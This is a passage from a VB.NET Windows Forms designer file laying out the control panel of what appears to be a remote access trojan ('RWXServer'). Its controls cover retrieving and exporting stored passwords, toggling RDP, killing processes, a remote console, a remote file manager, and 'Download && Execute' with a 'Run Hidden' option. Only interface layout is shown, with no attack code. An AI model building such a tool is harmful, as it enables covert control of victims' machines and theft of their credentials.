        Me.txtFolder.ReadOnly = True
        Me.txtFolder.Size = New System.Drawing.Size(276, 20)
        Me.txtFolder.TabIndex = 9
        '
        'lstContent
        '
        Me.lstContent.Columns.AddRange(New System.Windows.Forms.ColumnHeader() {Me.Name1, Me.Size})
        Me.lstContent.ContextMenuStrip = Me.ContextMenuStrip3
        Me.lstContent.FullRowSelect = True
        Me.lstContent.Location = New System.Drawing.Point(123, 42)
        Me.lstContent.Name = "lstContent"
        Me.lstContent.Size = New System.Drawing.Size(433, 191)
        Me.lstContent.SmallImageList = Me.ImageList2
        Me.lstContent.TabIndex = 4
        Me.lstContent.UseCompatibleStateImageBehavior = False
        Me.lstContent.View = System.Windows.Forms.View.Details
        '
        'Name1
        '
        Me.Name1.Text = "Name"
        Me.Name1.Width = 150
        '
        'Size
        '
        Me.Size.Text = "Size"
        '
        'cmdStopFile
        '
        Me.cmdStopFile.Enabled = False
        Me.cmdStopFile.Location = New System.Drawing.Point(123, 6)
        Me.cmdStopFile.Name = "cmdStopFile"
        Me.cmdStopFile.Size = New System.Drawing.Size(106, 23)
        Me.cmdStopFile.TabIndex = 8
        Me.cmdStopFile.Text = "Stop Fileserver"
        Me.cmdStopFile.UseVisualStyleBackColor = True
        '
        'lstDrives
        '
        Me.lstDrives.Columns.AddRange(New System.Windows.Forms.ColumnHeader() {Me.ColumnHeader7})
        Me.lstDrives.FullRowSelect = True
        Me.lstDrives.Location = New System.Drawing.Point(6, 42)
        Me.lstDrives.Name = "lstDrives"
        Me.lstDrives.Size = New System.Drawing.Size(111, 308)
        Me.lstDrives.SmallImageList = Me.ImageList2
        Me.lstDrives.TabIndex = 6
        Me.lstDrives.UseCompatibleStateImageBehavior = False
        Me.lstDrives.View = System.Windows.Forms.View.Details
        '
        'ColumnHeader7
        '
        Me.ColumnHeader7.Text = "Drives"
        '
        'TabPage6
        '
        Me.TabPage6.Controls.Add(Me.GroupBox3)
        Me.TabPage6.Controls.Add(Me.GroupBox2)
        Me.TabPage6.Location = New System.Drawing.Point(124, 4)
        Me.TabPage6.Name = "TabPage6"
        Me.TabPage6.Size = New System.Drawing.Size(716, 388)
        Me.TabPage6.TabIndex = 9
        Me.TabPage6.Text = "Misc"
        Me.TabPage6.UseVisualStyleBackColor = True
        '
        'GroupBox3
        '
        Me.GroupBox3.Controls.Add(Me.cmdmsgboxSend)
        Me.GroupBox3.Controls.Add(Me.txtmsgboxText)
        Me.GroupBox3.Controls.Add(Me.txtmsgboxTitle)
        Me.GroupBox3.Location = New System.Drawing.Point(325, 8)
        Me.GroupBox3.Name = "GroupBox3"
        Me.GroupBox3.Size = New System.Drawing.Size(383, 102)
        Me.GroupBox3.TabIndex = 1
        Me.GroupBox3.TabStop = False
        Me.GroupBox3.Text = "Show Messagebox"
        '
        'cmdmsgboxSend
        '
        Me.cmdmsgboxSend.Location = New System.Drawing.Point(6, 71)
        Me.cmdmsgboxSend.Name = "cmdmsgboxSend"
        Me.cmdmsgboxSend.Size = New System.Drawing.Size(371, 23)
        Me.cmdmsgboxSend.TabIndex = 2
        Me.cmdmsgboxSend.Text = "Send Messagebox"
        Me.cmdmsgboxSend.UseVisualStyleBackColor = True
        '
        'txtmsgboxText
        '
        Me.txtmsgboxText.Location = New System.Drawing.Point(6, 45)
        Me.txtmsgboxText.Name = "txtmsgboxText"
        Me.txtmsgboxText.Size = New System.Drawing.Size(371, 20)
        Me.txtmsgboxText.TabIndex = 1
        Me.txtmsgboxText.Text = "Messagebox Text"
        '
        'txtmsgboxTitle
        '
        Me.txtmsgboxTitle.Location = New System.Drawing.Point(6, 19)
        Me.txtmsgboxTitle.Name = "txtmsgboxTitle"
        Me.txtmsgboxTitle.Size = New System.Drawing.Size(371, 20)
        Me.txtmsgboxTitle.TabIndex = 0
        Me.txtmsgboxTitle.Text = "Messagebox Title"
        '
        'GroupBox2
        '
        Me.GroupBox2.Controls.Add(Me.btnrun)
        Me.GroupBox2.Controls.Add(Me.chkrhidden)
        Me.GroupBox2.Controls.Add(Me.Label2)
        Me.GroupBox2.Controls.Add(Me.txtlink)
        Me.GroupBox2.Location = New System.Drawing.Point(13, 8)
        Me.GroupBox2.Name = "GroupBox2"
        Me.GroupBox2.Size = New System.Drawing.Size(306, 102)
        Me.GroupBox2.TabIndex = 0
        Me.GroupBox2.TabStop = False
        Me.GroupBox2.Text = "Download && Execute"
        '
        'btnrun
        '
        Me.btnrun.Location = New System.Drawing.Point(8, 68)
        Me.btnrun.Name = "btnrun"
        Me.btnrun.Size = New System.Drawing.Size(286, 23)
        Me.btnrun.TabIndex = 7
        Me.btnrun.Text = "Download && Execute"
        Me.btnrun.UseVisualStyleBackColor = True
        '
        'chkrhidden
        '
        Me.chkrhidden.AutoSize = True
        Me.chkrhidden.Location = New System.Drawing.Point(8, 45)
        Me.chkrhidden.Name = "chkrhidden"
        Me.chkrhidden.Size = New System.Drawing.Size(83, 17)
        Me.chkrhidden.TabIndex = 6
        Me.chkrhidden.Text = "Run Hidden"
        Me.chkrhidden.UseVisualStyleBackColor = True
        '
        'Label2
        '
        Me.Label2.AutoSize = True
        Me.Label2.Location = New System.Drawing.Point(5, 22)
        Me.Label2.Name = "Label2"
        Me.Label2.Size = New System.Drawing.Size(54, 13)
        Me.Label2.TabIndex = 5
        Me.Label2.Text = "Directlink:"
        '
        'txtlink
        '
        Me.txtlink.Location = New System.Drawing.Point(65, 19)
        Me.txtlink.Name = "txtlink"
        Me.txtlink.Size = New System.Drawing.Size(229, 20)
        Me.txtlink.TabIndex = 4
        '
        'x
        '
        Me.AutoScaleDimensions = New System.Drawing.SizeF(6.0!, 13.0!)
        Me.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font
        Me.ClientSize = New System.Drawing.Size(844, 396)
        Me.Controls.Add(Me.TabControlClass1)
        Me.FormBorderStyle = System.Windows.Forms.FormBorderStyle.SizableToolWindow
        Me.Name = "x"
        Me.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen
        Me.Text = "frmFunctions"
        Me.TransparencyKey = System.Drawing.Color.Fuchsia
        Me.ContextMenuStrip1.ResumeLayout(False)
        Me.ContextMenuStrip2.ResumeLayout(False)
        Me.ContextMenuStrip3.ResumeLayout(False)
        Me.TabControlClass1.ResumeLayout(False)
        Me.TabPage1.ResumeLayout(False)
        Me.TabPage1.PerformLayout()
        CType(Me.picRDP, System.ComponentModel.ISupportInitialize).EndInit()
        Me.TabPage2.ResumeLayout(False)
        Me.TabPage3.ResumeLayout(False)
        Me.TabPage9.ResumeLayout(False)
        Me.TabPage4.ResumeLayout(False)
        Me.TabPage5.ResumeLayout(False)
        Me.TabPage5.PerformLayout()
        Me.TabPage7.ResumeLayout(False)
        Me.TabControl1.ResumeLayout(False)
        Me.TabPage8.ResumeLayout(False)
        Me.TabPage8.PerformLayout()
        CType(Me.PictureBox1, System.ComponentModel.ISupportInitialize).EndInit()
        Me.GroupBox1.ResumeLayout(False)
        Me.GroupBox1.PerformLayout()
        CType(Me.picPreview, System.ComponentModel.ISupportInitialize).EndInit()
        Me.TabPage6.ResumeLayout(False)
        Me.GroupBox3.ResumeLayout(False)
        Me.GroupBox3.PerformLayout()
        Me.GroupBox2.ResumeLayout(False)
        Me.GroupBox2.PerformLayout()
        Me.ResumeLayout(False)

    End Sub
    Friend WithEvents TabControlClass1 As RWXServer.TabControlClass
    Friend WithEvents TabPage1 As System.Windows.Forms.TabPage
    Friend WithEvents TabPage2 As System.Windows.Forms.TabPage
    Friend WithEvents cmdExportPW As System.Windows.Forms.Button
    Friend WithEvents Host As System.Windows.Forms.ColumnHeader
    Friend WithEvents Username As System.Windows.Forms.ColumnHeader
    Friend WithEvents Password As System.Windows.Forms.ColumnHeader
    Friend WithEvents TabPage3 As System.Windows.Forms.TabPage
    Friend WithEvents TabPage4 As System.Windows.Forms.TabPage
    Friend WithEvents TabPage5 As System.Windows.Forms.TabPage
    Friend WithEvents TabPage7 As System.Windows.Forms.TabPage
    Friend WithEvents SaveFileDialog1 As System.Windows.Forms.SaveFileDialog
    Friend WithEvents cmdgetPW As System.Windows.Forms.Button
    Public WithEvents lstPWs As System.Windows.Forms.ListView
    Friend WithEvents cmdgetProcess As System.Windows.Forms.Button
    Friend WithEvents lstProc As System.Windows.Forms.ListView
    Friend WithEvents ColumnHeader1 As System.Windows.Forms.ColumnHeader
    Friend WithEvents ColumnHeader2 As System.Windows.Forms.ColumnHeader
    Friend WithEvents ColumnHeader4 As System.Windows.Forms.ColumnHeader
    Friend WithEvents ContextMenuStrip1 As System.Windows.Forms.ContextMenuStrip
    Friend WithEvents KillProcessToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents ImageList1 As System.Windows.Forms.ImageList
    Friend WithEvents picRDP As System.Windows.Forms.PictureBox
    Friend WithEvents cmdRDPoff As System.Windows.Forms.Button
    Friend WithEvents cmdRDPon As System.Windows.Forms.Button
    Friend WithEvents cmdquali As System.Windows.Forms.Button
    Friend WithEvents Label1 As System.Windows.Forms.Label
    Friend WithEvents cmbQuali As System.Windows.Forms.ComboBox
    Friend WithEvents TabPage9 As System.Windows.Forms.TabPage
    Friend WithEvents cmdGetService As System.Windows.Forms.Button
    Friend WithEvents lstService As System.Windows.Forms.ListView
    Friend WithEvents ColumnHeader3 As System.Windows.Forms.ColumnHeader
    Friend WithEvents ColumnHeader5 As System.Windows.Forms.ColumnHeader
    Friend WithEvents ContextMenuStrip2 As System.Windows.Forms.ContextMenuStrip
    Friend WithEvents ToolStripMenuItem1 As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents SuspendServiceToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents ColumnHeader6 As System.Windows.Forms.ColumnHeader
    Friend WithEvents cmdGetSoftware As System.Windows.Forms.Button
    Friend WithEvents lstSoftware As System.Windows.Forms.ListView
    Friend WithEvents ColumnHeader9 As System.Windows.Forms.ColumnHeader
    Friend WithEvents cmdStopCMD As System.Windows.Forms.Button
    Friend WithEvents cmdStartCMD As System.Windows.Forms.Button
    Friend WithEvents txtCommand As System.Windows.Forms.TextBox
    Friend WithEvents txtConsole As System.Windows.Forms.TextBox
    Friend WithEvents lstDrives As System.Windows.Forms.ListView
    Friend WithEvents ColumnHeader7 As System.Windows.Forms.ColumnHeader
    Friend WithEvents lstContent As System.Windows.Forms.ListView
    Friend WithEvents Name1 As System.Windows.Forms.ColumnHeader
    Friend WithEvents Size As System.Windows.Forms.ColumnHeader
    Friend WithEvents ContextMenuStrip3 As System.Windows.Forms.ContextMenuStrip
    Friend WithEvents UploadFileToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents DownloadFileToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents ExecuteFileToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents RenameFileFolderToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents DeleteFileFolderToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents GroupBox1 As System.Windows.Forms.GroupBox
    Friend WithEvents txtPreview As System.Windows.Forms.TextBox
    Friend WithEvents picPreview As System.Windows.Forms.PictureBox
    Friend WithEvents ImageList2 As System.Windows.Forms.ImageList
    Friend WithEvents cmdStopFile As System.Windows.Forms.Button
    Friend WithEvents cmdStartFile As System.Windows.Forms.Button
    Friend WithEvents PictureBox1 As System.Windows.Forms.PictureBox
    Friend WithEvents txtFolder As System.Windows.Forms.TextBox
    Friend WithEvents TabPage6 As System.Windows.Forms.TabPage
    Friend WithEvents GroupBox2 As System.Windows.Forms.GroupBox
    Friend WithEvents btnrun As System.Windows.Forms.Button
    Friend WithEvents chkrhidden As System.Windows.Forms.CheckBox
    Friend WithEvents Label2 As System.Windows.Forms.Label
    Friend WithEvents txtlink As System.Windows.Forms.TextBox
    Friend WithEvents chkmouse As System.Windows.Forms.CheckBox
    Friend WithEvents GroupBox3 As System.Windows.Forms.GroupBox
    Friend WithEvents cmdmsgboxSend As System.Windows.Forms.Button
    Friend WithEvents txtmsgboxText As System.Windows.Forms.TextBox
    Friend WithEvents txtmsgboxTitle As System.Windows.Forms.TextBox
    Friend WithEvents TabControl1 As System.Windows.Forms.TabControl
    Friend WithEvents TabPage8 As System.Windows.Forms.TabPage
End Class
